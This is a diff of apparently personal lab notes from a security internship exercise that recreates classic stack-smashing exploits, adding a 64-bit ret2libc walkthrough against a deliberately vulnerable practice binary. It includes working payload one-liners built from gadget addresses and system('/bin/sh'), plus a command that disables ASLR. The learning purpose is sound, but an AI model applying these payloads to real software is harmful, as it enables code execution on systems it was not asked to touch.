@@ -1,12 +1,13 @@
 # Virtual Machine setup
 
 The virtual machine used for the experiments is based on Ubuntu 19.10 Desktop.
-Updates are regularly installed to keep the system up to date.
+Updates are regularly installed to keep the system up to date.   
+ASLR is permanently deactivated on the machine by issuing the command `echo "kernel.randomize_va_space = 0" | sudo tee /etc/sysctl.d/01-disable-aslr.conf`.
 
 As the GDB version 8.3 included in the default Ubuntu repositories kept crashing, I installed GDB 9.1 from the source provided on the [official website](https://www.gnu.org/software/gdb/).
 Additionally, I installed `peda`, `pwndbg` and `gef` for easier debugging using an install script from a [GitHub repository](https://github.com/apogiatzis/gdb-peda-pwndbg-gef).   
 I also mounted the directory containing the internship data and files into the virtual machine and installed the OpenSSH Server to be able to `ssh` into the virtual machine and execute all the code whilst not having to make any changes to the host machine.
-It is, however, important to point out that if accessing a shell via `ssh` in the VM, the stack addresses differ from those when directly opening a terminal in the VM.
+It is, however, important to point out that if accessing a shell via `ssh` in the VM, the stack addresses may differ from those when directly opening a terminal in the VM.
 In addition, the `ssh` session adds additional information to the environment by setting environment variables which might lead to different offsets on the stack.
 
 Apart from that, no changes to the system were made.
@@ -16,7 +17,6 @@ Apart from that, no changes to the system were made.
 As a starting exercise, I am trying to recreate the examples and exploits from the [original paper](http://phrack.org/issues/49/14.html#article).
 The compiler flags for `gcc` generally used are `-m32 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0` (see e.g. the [Makefile](./Makefile.common)).
 Without those, current stack overflow mitigation measures do not allow to successfully overflow the buffers on the stack as described in the paper.
-Additionally, ASLR is permanently deactivated on the machine by issuing the command `echo "kernel.randomize_va_space = 0" | sudo tee /etc/sysctl.d/01-disable-aslr.conf`.
 
 ## example3.c
 The executable only provided a segfault because the return address was incorrectly overwritten (checked with `gdb`).
@@ -122,3 +122,55 @@ The attack is conducted by writing the shellcode to an environment variable, cal
 This is a pretty simple exploit, it does not even use tricks like NOP sleds in front of the shellcode.
 The whole exploit can be conducted by executing the [pwn_vulnerable.sh](./64bit%20Stack%20smashing%20-%20superkojiman/pwn_vulnerable.sh) shellscript which does all the calculation and formatting.
 
+## Part 2
+
+In the second part, the stack is not used for executing shellcode (i.e. by placing the shellcode directly on the stack via the input or by placing it on the stack via environment variables.)
+Instead, a `ret2libc` attack is conducted.  
+In this attack, the return address is overwritten such that the program jumps to libc and executes arbitrary code from there.
+As libc is included as a shared library, the code in there has to be executable.
+This way, we can work around the restriction that the NX bit might be set on the stack and our shellcode from the stack might not be executable.
+
+The necessary steps are the following:
+1. Find the address of the `system` function in libc via `gdb` (note: ASLR is still disabled, the address thus stays the same)
+2. Find a pointer to the string "/bin/sh" (easy, already included in the executable (see [vulnerable.c](./64bit%20Stack%20smashing%20-%20superkojiman/vulnerable.c#L14)))
+3. Find a gadget to load the pointer to this string into the register `rdi` before calling `system` (can be found in `__libc_csu_init`)
+4. Combine the addresses and run it
+
+The code is then the following (`cat` is necessary for keeping the shell open):
+```bash
+(python -c "from struct import pack; print(
+    'A' * 104 +                         # Padding to reach the return address
+    pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
+    pack('<Q', 0x000055555555603f) +    # Address of \"/bin/sh\" in function main
+    pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
+    )"; cat) | ./vulnerable
+```
+
+Unfortunately, this only yields a segmentation fault.
+After investigating by debugging, it can be found that the segfault occurs during the `movaps xmmword ptr [rsp + 0x50], xmm0` instruction in `do_system`.
+The segfault occurs because the stack pointer (here included by `rsp`) is not properly aligned.
+`movaps` requires the memory address to be aligned on 16 bytes (see [Intel instruction set reference](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf#page=701)).
+When the segfault occurs, the `rsp` register contains the value `0x7fffffffdeb8`, which obviously is not aligned to 16 bytes (last hex digit has to be `0`).
+By extending our data to be copied onto the stack by 8 bytes, we can achieve proper alignment.   
+As 64 bit addresses are exactly 8 bytes, the easiest way to achieve that is by adding an address to the stack that doesn't change our execution.
+This could be the address of a `ret` instruction before our `pop rdi; ret` gadget.
+Such an instruction has no effect: when we return to this instruction, it immediately returns to the next instruction which is our exploit code.
+
+Thus, a fixed version of the code is as follows:
+```bash
+(python -c "from struct import pack; print(
+    'A' * 104 +                         # Padding to reach the return address
+    pack('<Q', 0x00005555555551da) +    # Address of ret in function vuln
+    pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
+    pack('<Q', 0x000055555555603f) +    # Address of \"/bin/sh\" in function main
+    pack('<Q', 0x00007ffff7e1a4e0)      # Address of function system
+    )"; cat) | ./vulnerable
+```
+
+Note: when working through this exercise, I noticed that I could not just get the addresses from the executable but had to get the addresses from gdb.
+This is because the executable by default is compiled as PIE (Position Independent Executable).
+The addresses in the executable (e.g. showed by `objdump -d vulnerable`) are only offsets from the base address. 
+The base address (`0x0000555555554000`) is always the same, because ASLR is disabled.   
+If compiled with the compiler flag `-no-pie`, the executable would contain the absolute addresses of the instructions instead of relative ones relative to the base address.
+This would make it probably easier to find the addresses (in the code snippet above: addresses for the `ret` instruction, `pop rdi; ret` and `/bin/sh`) because it would be sufficient to just look at the executable without loading it into a debugger.
+However, it would still be necessary to get the address of the `system` function by loading it into a debugger, as libc is only dynamically loaded on runtime and the address thus cannot be determined without running the executable.
